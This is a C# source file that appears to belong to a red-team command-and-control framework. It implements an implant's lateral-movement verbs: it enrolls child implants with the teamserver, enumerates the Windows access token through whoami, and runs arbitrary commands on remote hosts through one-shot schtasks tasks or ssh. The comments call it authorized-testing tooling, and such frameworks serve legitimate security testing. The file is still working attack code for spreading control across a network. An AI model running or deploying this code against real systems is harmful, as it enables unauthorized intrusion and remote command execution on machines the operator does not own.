using System.Diagnostics;
using System.Security.Cryptography;
using Rod.V1;

namespace Rod.Implant.Internal;

// Holds the lateral.* verbs the reference implant advertises (architecture.md
// Sec 10.1). lateral.move derives a child implant. lateral.token and
// lateral.exec_remote (ADR 0004) cover the standard access-token and
// remote-execution surfaces every mainstream C2 exposes: on Windows, the
// documented administration channels (whoami for token context, schtasks for
// remote execution); on Linux, SSH for remote execution and a clear
// "Windows-only" refusal for token work.
//
// The child's stager token is not baked into this implant (its own token is
// spent at its own enroll); the operator provisions it in the task arguments.
// This keeps derivation inside the token-gated authorization model -- the
// server still resolves and scope-checks the parent before recording the
// linkage -- and mirrors how the recon verbs take their target in arguments.
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

internal static class Lateral
{
    /// <summary>
    /// Derives a child implant by enrolling a fresh identity against the
    /// teamserver this implant enrolled into, naming itself as the parent
    /// (architecture.md Sec 10.1). Arguments are "&lt;token&gt;" or
    /// "&lt;token&gt; &lt;class&gt;", whitespace-separated; the token is the
    /// child's stager secret (provisioned by the operator) and the optional class
    /// names a non-default implant class.
    /// </summary>
    /// <returns>
    /// Succeeded with the child implant id (and the echoed parent when the server
    /// returns one) when the enroll round-trip completes; Failed with a clear
    /// cause otherwise. A handler built without an enroll bundle (derivation
    /// disabled) reports Failed so the operator sees the cause rather than a
    /// silent no-op.
    /// </returns>
    public static async Task<(TaskOutcome Outcome, string Output)> MoveAsync(
        string arguments,
        EnrollBundle? enroll)
    {
        if (enroll is null)
            return (TaskOutcome.Failed, "lateral.move is not available (no enroll bundle)");

        if (!TryParseArgs(arguments, out var token, out var requestedClass))
            return (TaskOutcome.Failed, "lateral.move expects '<token>' or '<token> <class>'");

        // A child owns its own keypair; only the public half crosses enroll
        // (architecture.md Sec 9). ECDSA P-256, the parent's key shape.
        using var childKey = ECDsa.Create(ECCurve.NamedCurves.nistP256);
        try
        {
            // The child enrolls against the same endpoint, naming this implant as
            // parent and forwarding the requested class so a non-default class is
            // honored instead of silently defaulting to stage-2. The server
            // resolves and scope-checks the parent before recording the linkage
            // (architecture.md Sec 10.1). The child reports this machine's host
            // facts: the enroll happens in this implant's process, so the child's
            // device identity is the host it was derived on. The dial goes
            // through the transport selection's enroll dispatch, so a
            // quic-schemed bundle URL (the walk's current entry is a quic front)
            // runs the QUIC frame exchange; its connection closes here -- the
            // child holds no session in this process.
            var dial = new EnrollDial(
                enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile,
                requestedClass, HostIdentity.Capture());
            var enrolled = await TransportSelection.EnrollAsync(dial);
            if (dial.OpenedConnection is { } childWire)
                await childWire.DisposeAsync();
            // A Pivot-class child has no process of its own (architecture.md
            // Sec 5.2): its tasking will arrive on this implant's stream marked
            // with the child's id, and the fronting gate accepts only children
            // recorded here -- the enrollment this implant performed is the
            // voucher.
            if (string.Equals(requestedClass, "Pivot", StringComparison.OrdinalIgnoreCase))
                enroll.Fronted.Record(enrolled.ImplantId);
            // Report the child id so the operator can confirm the recorded lineage.
            // The server echoes the parent back, so include it when present as an
            // independent confirmation the linkage landed.
            var output = enrolled.ParentImplantId.Length > 0
                ? $"{enrolled.ImplantId}\nparent={enrolled.ParentImplantId}"
                : enrolled.ImplantId;
            return (TaskOutcome.Succeeded, output);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "enroll child: " + ex.Message);
        }
    }

    /// <summary>
    /// Synchronous wrapper over <see cref="MoveAsync"/> for the registry's
    /// synchronous dispatch path (the beacon loop blocks on each task). Runs the
    /// async enroll on the thread pool and waits for it.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) Move(string arguments, EnrollBundle? enroll)
        => MoveAsync(arguments, enroll).GetAwaiter().GetResult();

    /// <summary>
    /// Reports the current process's access-token context -- the user, groups,
    /// and privileges that determine what impersonation and lateral movement are
    /// possible from this implant (architecture.md Sec 10.1, ADR 0004). A
    /// read-only enumeration; it does not duplicate, steal, or apply any token.
    /// On Windows it runs <c>whoami /user /groups /priv</c>, the documented
    /// administration command for inspecting the calling process's token; on
    /// other platforms it reports a clear Windows-only refusal so the operator
    /// sees the cause rather than a silent no-op.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) Token(string arguments)
    {
        if (!OperatingSystem.IsWindows())
        {
            return (TaskOutcome.Failed,
                "lateral.token is a Windows access-token capability; not supported on this OS");
        }

        return NativeCommand.RunCaptured("whoami", "/user /groups /priv");
    }

    /// <summary>
    /// Runs a command on a remote host over a documented administration channel
    /// (architecture.md Sec 10.1, ADR 0004). Arguments are
    /// "&lt;host&gt; &lt;command...&gt;". On Windows the handler drives the
    /// built-in scheduled-task workflow against the target -- create, run, then
    /// delete -- the same surface PsExec-class tools and every Windows
    /// administration guide document; the task's stdout is not captured back
    /// over RPC, so the outcome reflects whether the task was created and run.
    /// On Linux the handler runs <c>ssh &lt;host&gt; &lt;command&gt;</c>,
    /// capturing its combined output.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) ExecRemote(string arguments)
    {
        if (!TryParseExecRemoteArgs(arguments, out var host, out var command))
            return (TaskOutcome.Failed, "lateral.exec_remote expects '<host> <command...>'");

        if (OperatingSystem.IsWindows())
            return RunRemoteScheduledTask(host, command);
        return NativeCommand.RunCaptured("ssh", $"{host} {command}");
    }

    // Creates, runs, and deletes a one-shot scheduled task on the remote host,
    // mirroring the documented `schtasks /create /s <host> ... /run` workflow.
    // The RPC channel does not return the task's stdout, so the outcome is
    // whether the task was created and run; the operator reads results off the
    // target. A failure at any step cleans up the task before reporting.
    private static (TaskOutcome, string) RunRemoteScheduledTask(string host, string command)
    {
        var taskName = "RodRemoteExec" + DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

        // The /tr payload is quoted: schtasks splits unquoted arguments on
        // spaces, so a multi-word command would parse as unknown schtasks
        // switches. Embedded quotes are doubled, the escape CommandLineToArgvW
        // consumes inside a quoted argument.
        var (createOutcome, createOutput) = NativeCommand.RunCaptured(
            "schtasks", $"/create /s {host} /tn {taskName} /tr {NativeCommand.Quote(command)} /sc once /st 00:00 /f");
        if (createOutcome == TaskOutcome.Failed)
            return (TaskOutcome.Failed, $"create remote task {taskName} on {host}: {createOutput}");

        var (runOutcome, runOutput) = NativeCommand.RunCaptured("schtasks", $"/run /s {host} /tn {taskName}");
        if (runOutcome == TaskOutcome.Failed)
        {
            _ = NativeCommand.RunCaptured("schtasks", $"/delete /s {host} /tn {taskName} /f");
            return (TaskOutcome.Failed, $"run remote task {taskName} on {host}: {runOutput}");
        }

        _ = NativeCommand.RunCaptured("schtasks", $"/delete /s {host} /tn {taskName} /f");
        return (TaskOutcome.Succeeded, $"ran {command} on {host} via task {taskName}");
    }

    // Splits "<host> <command...>" into the host and the command string. The
    // command keeps its internal whitespace; only the first token is the host.
    // Returns false when fewer than two fields are present.
    internal static bool TryParseExecRemoteArgs(string arguments, out string host, out string command)
    {
        host = string.Empty;
        command = string.Empty;
        var fields = arguments.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length < 2)
            return false;
        host = fields[0];
        command = string.Join(' ', fields, 1, fields.Length - 1);
        return true;
    }

    // Splits the lateral.move argument string into the child stager token and an
    // optional implant class. Returns false when the token is empty or more than
    // two fields are present, mirroring the recon verbs' strict parse.
    internal static bool TryParseArgs(string arguments, out string token, out string? @class)
    {
        token = string.Empty;
        @class = null;
        var fields = arguments.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length is 0 or > 2)
            return false;
        token = fields[0];
        if (fields.Length == 2)
            @class = fields[1];
        return true;
    }
}
